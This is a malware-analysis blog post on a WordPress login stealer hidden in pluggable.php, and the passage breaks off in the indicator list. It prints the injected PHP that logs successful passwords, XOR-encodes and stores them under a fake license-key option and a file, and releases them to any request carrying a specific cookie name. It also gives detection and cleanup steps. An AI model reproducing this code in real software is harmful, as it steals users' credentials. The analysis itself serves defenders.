---
title: pluggable.php Login Stealer - XOR'd Passwords in a Fake License Key
url: https://lukeleal.com/research/posts/pluggable-php-wp-authenticate-stealer/
source: Over Security
date: 2026-11-01
fetch_date: 2026-11-02T08:33:24.242224
---

# pluggable.php Login Stealer - XOR'd Passwords in a Fake License Key

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [pluggable.php Login Stealer - XOR’d Passwords in a Fake License Key](https://lukeleal.com/research/posts/pluggable-php-wp-authenticate-stealer/)

2024-05-14Luke

#[pluggable.php](https://lukeleal.com/research/tags/pluggable.php/)
#[wp\_authenticate](https://lukeleal.com/research/tags/wp_authenticate/)
#[wpsdt4\_license\_key](https://lukeleal.com/research/tags/wpsdt4_license_key/)
#[credential stealer](https://lukeleal.com/research/tags/credential-stealer/)
#[backdoor](https://lukeleal.com/research/tags/backdoor/)
#[WordPress](https://lukeleal.com/research/tags/wordpress/)
#[PHP](https://lukeleal.com/research/tags/php/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
![pluggable.php Login Stealer - XOR'd Passwords in a Fake License Key](https://lukeleal.com/research/pluggable-stealer-cover-q90.jpg "Cover Image")

## Table of Contents

* [Why pluggable.php](#why-pluggablephp)
* [Two Hiding Places](#two-hiding-places)
* [The Retrieval Backdoor](#the-retrieval-backdoor)
  + [The inverted condition](#the-inverted-condition)
* [Decoding the Log](#decoding-the-log)
* [Detection & Cleanup](#detection--cleanup)
* [IOCs](#iocs)
* [Sample](#sample)

In my [wp-login.php keylogger post](https://lukeleal.com/research/posts/wp-login-keylogger/) the injection sat in the login page itself. This sample goes one level deeper into WordPress: it modifies **`wp-includes/pluggable.php`**, the core file that defines `wp_authenticate()`, so the credentials are captured no matter *how* a user logs in.

> It only logs logins that succeeded. The attacker gets working passwords and nothing else.

## Why pluggable.php[#](#why-pluggablephp)

`wp_authenticate()` is the function WordPress calls to check a username and password. The login form, `xmlrpc.php`, and plugins that handle logins all end up there. By editing the function in place, the attacker doesn’t have to hook into any one login page.

The rest of the file is unchanged, so a quick look at the function shows nothing unusual until you notice the extra block in the middle:

```
if (!is_wp_error($user))
{
    $csrf = "_ktpOLnmdRNS5KziA36E7y0jhQcfFga82uPCIGXVHD1MwvxoTUJYZbBrW";
    $line = $password . "\t" . $username . "\t" . get_site_url();
    $line = $line ^ str_repeat($csrf, (strlen($line) / strlen($csrf)) + 1);
    $line = bin2hex($line);
```

`!is_wp_error($user)` is only true when `apply_filters('authenticate', ...)` returned a real `WP_User`, in other words when the password was **correct**. The record is `password`, `username` and the site URL, separated by tabs.

The variable is named `$csrf` to look like a security token. It’s actually the XOR key, a 57 character string. PHP’s `^` operator on two strings XORs them byte by byte, and the key is repeated to cover the length of the record. `bin2hex` then turns the result into plain hex text.

## Two Hiding Places[#](#two-hiding-places)

The encoded line is saved twice:

```
$lines = @file("52aba346", FILE_IGNORE_NEW_LINES);
$lines[] = $line;
@file_put_contents("52aba346", implode("\n", array_unique($lines)));

$lines = get_option('wpsdt4_license_key');
$lines = explode("\n", $lines);
$lines[] = $line;
$lines = array_unique($lines);

update_option('wpsdt4_license_key', implode("\n", array_unique($lines)));
```

1. A **file** called `52aba346`. The path is relative, so it goes into whatever directory PHP is currently running in. For a normal login at `wp-login.php` that’s the site root.
2. A **database option** called `wpsdt4_license_key`. It’s named to look like a plugin’s license key setting, which administrators tend to ignore.

Both use `array_unique`, so a user who logs in 100 times produces one record, not 100. That keeps the file small.

The database copy survives if someone deletes the file, and the file survives if someone cleans the database. At least that’s the idea; see the bug below.

## The Retrieval Backdoor[#](#the-retrieval-backdoor)

At the bottom of the file, outside any function, there’s a block that runs on every request:

```
if (isset($_COOKIE["_ktpOLnmdRNS5KziA36E7y0jhQcfFga82uPCIGXVHD1MwvxoTUJYZbBrW"]))
{
    $lines = get_option( 'wpsdt4_license_key' );
    if (!empty($lines))
    {
        $lines = @file_get_contents("52aba346");
    }
    echo $lines;
    exit();
}
```

If the request has a cookie whose *name* is the same 57 character string as the XOR key, the site prints the stolen data and stops. The cookie’s value doesn’t matter. It’s an `isset` check.

There’s no `/shell.php` to find or URL to block. Any page on the site works as the endpoint, so the attacker can collect the passwords with a single request to the home page.

### The inverted condition[#](#the-inverted-condition)

I traced through this block, and it doesn’t do what the author probably meant. The condition is `!empty($lines)`, so:

| Option | File | What gets printed |
| --- | --- | --- |
| has data | has data | the file’s contents |
| has data | missing | nothing (`file_get_contents` returns `false`) |
| empty | any | nothing (the empty option) |

The database copy is **never served**. It looks like the check was supposed to be `empty()`, to fall back to the file when the option is missing, so the redundancy only works in one direction. In the normal case, where both exist, the attacker still gets the data from the file.

## Decoding the Log[#](#decoding-the-log)

The XOR key is stored in the same file as the data it protects, and in the same string as the cookie name. So for a site owner, the key is already known. Here’s the decoding in PHP, tested with made up credentials:

```
$csrf = "_ktpOLnmdRNS5KziA36E7y0jhQcfFga82uPCIGXVHD1MwvxoTUJYZbBrW";
$raw  = hex2bin($line);
$dec  = $raw ^ str_repeat($csrf, (int)(strlen($raw) / strlen($csrf)) + 1);
print_r(explode("\t", $dec));
// ["Hunter2!x", "demo-admin", "hxxps://example[.]test"]
```

If you find `52aba346` or the `wpsdt4_license_key` option on a site, you can decode every line and see **exactly which accounts were exposed**. This matters because every one of those passwords was valid on the day it was logged. Reset them all, and check whether the same passwords were reused on other services.

## Detection & Cleanup[#](#detection--cleanup)

* Compare `wp-includes/pluggable.php` against the matching version of WordPress core. `wp core verify-checksums` will flag it. Never trust a modified timestamp: it can be forged.
* Search the database for the `wpsdt4_license_key` option: `SELECT option_value FROM wp_options WHERE option_name = 'wpsdt4_license_key';` Depending on your WordPress version it may also be autoloaded, which means it’s pulled into memory on every page load.
* Look for a file named `52aba346` in the site root or in `wp-admin/`.
* Search web server logs for requests that include a cookie with the key string in its name. If you see one, the attacker has been collecting.
* After cleanup, **reset all passwords**, including for users who have not logged in recently. Anyone who logged in while the file was infected is exposed. Also invalidate sessions and rotate the WordPress salts in `wp-config.php`.

## IOCs[#](#iocs)

```
File:    wp-includes/pluggable.php (modified)
File:    52aba346  (in site root, hex-encoded XOR lines)
Option:...